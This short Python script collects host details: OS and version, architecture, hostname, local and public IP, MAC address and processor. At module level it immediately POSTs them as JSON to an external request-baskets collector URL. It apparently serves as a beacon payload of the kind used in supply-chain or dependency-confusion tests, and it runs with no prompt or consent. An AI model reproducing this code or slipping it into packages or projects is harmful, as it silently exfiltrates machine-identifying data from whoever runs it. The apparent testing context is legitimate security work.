import platform,socket,re,uuid,json
import urllib.request

def get_public_ip():
    url = "http://ifconfig.me"
    resp = urllib.request.urlopen(url)
    return resp.read().decode("utf-8")

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't even have to be reachable
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def get_system_info():
    try:
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=get_ip()
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['public-ip']=get_public_ip()
        return info
    except Exception as e:
        return {}


url = "https://request-baskets-security.apps.sc01t.otc-test.sbb.ch/4a5d55d"
req = urllib.request.Request(url)
req.add_header('Content-Type', 'application/json; charset=utf-8')
jsondata = json.dumps(get_system_info())
jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
req.add_header('Content-Length', str(len(jsondataasbytes)))
response = urllib.request.urlopen(req, jsondataasbytes)

